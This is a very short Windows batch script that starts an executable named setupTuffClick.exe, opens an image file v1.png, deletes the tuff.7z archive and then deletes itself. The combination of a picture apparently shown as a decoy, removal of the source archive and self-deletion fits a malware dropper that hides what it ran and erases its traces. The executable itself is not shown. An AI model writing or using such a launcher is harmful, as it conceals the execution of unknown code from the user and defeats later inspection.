@echo off
start setupTuffClick.exe
start v1.png
del tuff.7z

start /b "" cmd /c del "%~f0"&exit /b
